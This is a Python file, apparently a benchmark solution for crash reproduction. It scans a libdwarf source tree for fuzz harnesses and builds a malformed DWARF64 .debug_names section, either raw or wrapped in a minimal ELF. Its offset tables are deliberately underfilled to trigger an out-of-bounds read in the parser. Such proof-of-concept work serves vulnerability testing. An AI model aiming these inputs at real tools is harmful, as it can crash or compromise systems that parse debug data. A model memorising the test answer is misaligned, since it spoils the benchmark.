import os
import tarfile
import struct
from typing import Dict, List, Optional, Tuple


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    return (off + (a - 1)) & ~(a - 1)


def _pack_elf64_ehdr(e_shoff: int, e_shnum: int, e_shstrndx: int) -> bytes:
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # little-endian
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # SYSV
    # rest 0
    return struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        1,  # ET_REL
        62,  # EM_X86_64
        1,  # EV_CURRENT
        0,  # e_entry
        0,  # e_phoff
        e_shoff,
        0,  # e_flags
        64,  # e_ehsize
        0,  # e_phentsize
        0,  # e_phnum
        64,  # e_shentsize
        e_shnum,
        e_shstrndx,
    )


def _pack_elf64_shdr(
    sh_name: int,
    sh_type: int,
    sh_flags: int,
    sh_addr: int,
    sh_offset: int,
    sh_size: int,
    sh_link: int,
    sh_info: int,
    sh_addralign: int,
    sh_entsize: int,
) -> bytes:
    return struct.pack(
        "<IIQQQQIIQQ",
        sh_name,
        sh_type,
        sh_flags,
        sh_addr,
        sh_offset,
        sh_size,
        sh_link,
        sh_info,
        sh_addralign,
        sh_entsize,
    )


def _build_debug_names_dwarf64_underfilled(
    name_count: int = 8,
    bucket_count: int = 1,
    comp_unit_count: int = 0,
    local_type_unit_count: int = 0,
    foreign_type_unit_count: int = 0,
) -> bytes:
    if name_count <= 0:
        name_count = 1
    if bucket_count <= 0:
        bucket_count = 1
    offset_size = 8

    header = bytearray()
    header += struct.pack("<H", 5)  # version
    header += struct.pack("<H", 0)  # padding
    header += struct.pack("<I", comp_unit_count)
    header += struct.pack("<I", local_type_unit_count)
    header += struct.pack("<I", foreign_type_unit_count)
    header += struct.pack("<I", bucket_count)
    header += struct.pack("<I", name_count)
    header += struct.pack("<I", 1)  # abbrev_table_size
    header += struct.pack("<I", 0)  # augmentation_string_size

    body = bytearray()
    # augmentation string none

    # CU offsets table
    for _ in range(comp_unit_count):
        body += struct.pack("<Q", 0)

    # local type unit offsets table
    for _ in range(local_type_unit_count):
        body += struct.pack("<Q", 0)

    # foreign type unit signatures (8 bytes each)
    for _ in range(foreign_type_unit_count):
        body += struct.pack("<Q", 0)

    # buckets (4 bytes each)
    body += struct.pack("<I", 1)
    for _ in range(bucket_count - 1):
        body += struct.pack("<I", 0)

    # hashes (8 bytes each)
    body += struct.pack("<Q", 0x123456789ABCDEF0)
    for _ in range(name_count - 1):
        body += struct.pack("<Q", 0)

    # string_offsets table - intentionally underfilled as 4 bytes per entry (should be 8 for DWARF64)
    for _ in range(name_count):
        body += struct.pack("<I", 0)

    # entry_offsets table - intentionally underfilled as 4 bytes per entry (should be 8 for DWARF64)
    for _ in range(name_count):
        body += struct.pack("<I", 0)

    # abbrev table size = 1, one byte 0 terminator
    body += b"\x00"
    # entry pool: one byte 0 (uleb abbrev_code == 0, end of list)
    body += b"\x00"

    unit_payload = bytes(header) + bytes(body)
    unit_length = len(unit_payload)

    out = bytearray()
    out += struct.pack("<I", 0xFFFFFFFF)
    out += struct.pack("<Q", unit_length)
    out += unit_payload
    return bytes(out)


def _build_debug_info_dwarf64_minimal() -> bytes:
    # Minimal DWARF5 compile unit with empty DIE list, abbrev offset = 0
    # DWARF64: initial_length 0xffffffff + unit_length(8)
    version = 5
    unit_type = 1  # DW_UT_compile
    address_size = 8
    abbrev_offset = 0
    header = struct.pack("<HBBQ", version, unit_type, address_size, abbrev_offset)
    body = b"\x00"
    unit_length = len(header) + len(body)
    return struct.pack("<IQ", 0xFFFFFFFF, unit_length) + header + body


def _build_elf_with_sections(sections: List[Tuple[str, int, bytes, int]]) -> bytes:
    # sections: list of (name, sht_type, data, align), excluding null and shstrtab which are added
    names = ["", ".shstrtab"] + [s[0] for s in sections]
    shstr = bytearray(b"\x00")
    name_off: Dict[str, int] = {"": 0}
    for nm in names[1:]:
        name_off[nm] = len(shstr)
        shstr += nm.encode("ascii", "strict") + b"\x00"

    # Build section data layout
    elf_header_size = 64
    cur = elf_header_size

    # Section 0: null
    shdrs: List[bytes] = []

    # Section 1: shstrtab
    shstrtab_data = bytes(shstr)
    cur = _align(cur, 1)
    shstrtab_off = cur
    cur += len(shstrtab_data)

    # Other sections
    sec_offsets: List[int] = []
    for (nm, sht, data, align) in sections:
        cur = _align(cur, align if align > 0 else 1)
        sec_offsets.append(cur)
        cur += len(data)

    # Section header table
    cur = _align(cur, 8)
    e_shoff = cur
    e_shnum = 2 + len(sections)
    e_shstrndx = 1
    sh_table_size = e_shnum * 64
    file_size = e_shoff + sh_table_size

    blob = bytearray(b"\x00" * file_size)
    blob[0:64] = _pack_elf64_ehdr(e_shoff=e_shoff, e_shnum=e_shnum, e_shstrndx=e_shstrndx)

    # Write section data
    blob[shstrtab_off:shstrtab_off + len(shstrtab_data)] = shstrtab_data
    for idx, (_, _, data, _) in enumerate(sections):
        off = sec_offsets[idx]
        blob[off:off + len(data)] = data

    # Build section headers
    shdrs.append(_pack_elf64_shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    shdrs.append(_pack_elf64_shdr(name_off[".shstrtab"], 3, 0, 0, shstrtab_off, len(shstrtab_data), 0, 0, 1, 0))
    for i, (nm, sht, data, align) in enumerate(sections):
        shdrs.append(_pack_elf64_shdr(name_off[nm], sht, 0, 0, sec_offsets[i], len(data), 0, 0, align if align > 0 else 1, 0))

    shdr_blob = b"".join(shdrs)
    blob[e_shoff:e_shoff + len(shdr_blob)] = shdr_blob
    return bytes(blob)


def _iter_source_texts(src_path: str, max_files: int = 4000) -> List[Tuple[str, bytes]]:
    out: List[Tuple[str, bytes]] = []

    def should_consider(name: str) -> bool:
        low = name.lower()
        if any(part in low for part in ("fuzz", "oss-fuzz", "fuzzer")):
            return True
        if low.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
            return True
        return False

    if os.path.isdir(src_path):
        count = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if count >= max_files:
                    return out
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path)
                if not should_consider(rel):
                    continue
                try:
                    st = os.stat(path)
                    if st.st_size > 800_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    out.append((rel, data))
                    count += 1
                except Exception:
                    pass
        return out

    # Tarball
    try:
        with tarfile.open(src_path, "r:*") as tf:
            count = 0
            for m in tf.getmembers():
                if count >= max_files:
                    break
                if not m.isfile():
                    continue
                name = m.name
                if not should_consider(name):
                    continue
                if m.size > 800_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    out.append((name, data))
                    count += 1
                except Exception:
                    pass
    except Exception:
        pass
    return out


def _detect_raw_section_fuzzer(src_texts: List[Tuple[str, bytes]]) -> Optional[bool]:
    # Try to find a likely fuzzer target related to debug_names
    fuzzer_candidates: List[Tuple[int, str, bytes]] = []
    for name, data in src_texts:
        if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
            score = 0
            low = name.lower().encode("utf-8", "ignore")
            if b"debug" in low and b"name" in low:
                score += 5
            if b"debug_names" in data or b"debugnames" in data or b"dnames" in data:
                score += 10
            if b".debug_names" in data:
                score += 10
            if b"dwarf_debugnames" in data or b"dwarf_dnames" in data:
                score += 10
            if score > 0:
                fuzzer_candidates.append((score, name, data))

    if not fuzzer_candidates:
        return None

    fuzzer_candidates.sort(reverse=True, key=lambda x: x[0])
    _, _, best = fuzzer_candidates[0]

    # Heuristic: if it constructs Dwarf_Obj_Access_Interface and maps input buffer as a section named .debug_names => raw
    if b".debug_names" in best and (b"Dwarf_Obj_Access_Interface" in best or b"Obj_Access" in best or b"obj_access" in best):
        # Look for patterns suggesting sections are synthesized from input, not ELF
        if (b"section" in best.lower() and b"data" in best.lower()) or b"get_section" in best.lower():
            return True

    # Another heuristic: if it writes data to a temp file or calls dwarf_init on fd/path, likely expects an object file => not raw
    if b"mkstemp" in best or b"tmpfile" in best or b"fopen" in best or b"open(" in best or b"write(" in best:
        if b"dwarf_init" in best or b"dwarf_object_init" in best:
            return False
    if b"dwarf_object_init_b" in best:
        # Could be either, but often used with synthesized sections in fuzzers
        if b".debug_names" in best:
            return True

    # Default guess: object file input (ELF)
    return False


def _dwarf_debugnames_c_supports_dwarf64(src_texts: List[Tuple[str, bytes]]) -> Optional[bool]:
    for name, data in src_texts:
        low = name.lower()
        if low.endswith("dwarf_debugnames.c") or low.endswith("/dwarf_debugnames.c"):
            if b"0xffffffff" in data.lower() or b"dwarf_64" in data.lower() or b"DWARF_64" in data:
                return True
            return False
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        src_texts = _iter_source_texts(src_path)
        raw_hint = _detect_raw_section_fuzzer(src_texts)
        dwarf64_hint = _dwarf_debugnames_c_supports_dwarf64(src_texts)

        # Build PoC for the likely harness:
        # - raw: return only .debug_names section bytes
        # - non-raw: return a minimal ELF containing .debug_names (and minimal related sections)
        if raw_hint is True:
            if dwarf64_hint is False:
                # Fallback: still try DWARF64 unit; many parsers support it even if string not found
                pass
            return _build_debug_names_dwarf64_underfilled(
                name_count=8,
                bucket_count=1,
                comp_unit_count=0,
                local_type_unit_count=0,
                foreign_type_unit_count=0,
            )

        # Default to ELF container
        debug_names = _build_debug_names_dwarf64_underfilled(
            name_count=8,
            bucket_count=1,
            comp_unit_count=1,
            local_type_unit_count=0,
            foreign_type_unit_count=0,
        )
        debug_info = _build_debug_info_dwarf64_minimal()
        debug_abbrev = b"\x00"
        debug_str = b"\x00"

        sections = [
            (".debug_names", 1, debug_names, 1),
            (".debug_info", 1, debug_info, 1),
            (".debug_abbrev", 1, debug_abbrev, 1),
            (".debug_str", 1, debug_str, 1),
        ]
        return _build_elf_with_sections(sections)